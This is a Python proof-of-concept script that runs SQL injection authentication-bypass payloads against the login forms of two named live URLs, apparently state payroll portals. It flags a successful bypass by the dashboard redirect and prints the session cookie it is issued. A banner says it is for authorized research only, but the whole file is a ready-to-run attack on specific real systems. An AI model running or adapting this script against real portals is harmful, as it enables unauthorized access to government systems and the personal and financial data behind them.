#!/usr/bin/env python3
import requests
import urllib.parse
import time

def print_banner():
    print("="*60)
    print("  Veripay Authentication Bypass PoC")
    print("  Target: Enugu / CRS State Portals")
    print("  NOTE: For authorized security research only.")
    print("="*60)

def test_sqli(target_url):
    # Common authentication bypass payloads for legacy PHP/MySQL
    payloads = [
        "' OR '1'='1",
        "admin' -- -",
        "admin'#",
        "' OR 1=1 LIMIT 1-- -",
        "admin' OR 'a'='a"
    ]

    print(f"[*] Target Endpoint: {target_url}\n")

    for payload in payloads:
        print(f"[*] Testing payload: {payload}")
        
        # Form fields identified during reconnaissance
        data = {
            "Loginlogin": payload,
            "Loginpassword": "PentestPassword123!",
            "LoginButton_DoLogin": "Login"
        }
        
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Content-Type": "application/x-www-form-urlencoded"
        }

        try:
            # allow_redirects=False is crucial to catch the 302 redirect upon successful login
            response = requests.post(target_url, data=data, headers=headers, timeout=10, allow_redirects=False)
            
            # A successful login usually triggers a 302 redirect to the dashboard (e.g., Default.php)
            if response.status_code in [301, 302]:
                location = response.headers.get("Location", "")
                if "Default.php" in location or "Dashboard" in location:
                    print(f"[+] VULNERABLE! Authentication bypassed successfully.")
                    print(f"[+] Payload: {payload}")
                    print(f"[+] Redirects to: {location}")
                    print(f"[+] Session Cookie Issued: {response.cookies.get_dict()}")
                    return True
                else:
                    print(f"[-] Received redirect to {location}, but not dashboard.")
            elif response.status_code == 200:
                # If no redirect, check if the error message is absent indicating a logic bypass
                if "Invalid credentials" not in response.text and "Incorrect" not in response.text:
                    print(f"[?] Potential logic bypass or altered response. Manual inspection required.")
                else:
                    print("[-] Payload failed (Invalid credentials).")
            else:
                print(f"[-] Unexpected HTTP {response.status_code}")
                
        except requests.exceptions.RequestException as e:
            print(f"[!] Connection Error: {e}")
            
        time.sleep(1) # Gentle throttling

    print("\n[-] All payloads exhausted for this target.")
    return False

if __name__ == "__main__":
    print_banner()
    
    targets = [
        "https://www.veripaysuite.com/enugu/MainLogin.php?ccsForm=Login",
        "https://www.veripaysuite.com/crs/MainLogin.php?ccsForm=Login"
    ]
    
    for url in targets:
        test_sqli(url)
        print("-" * 60)
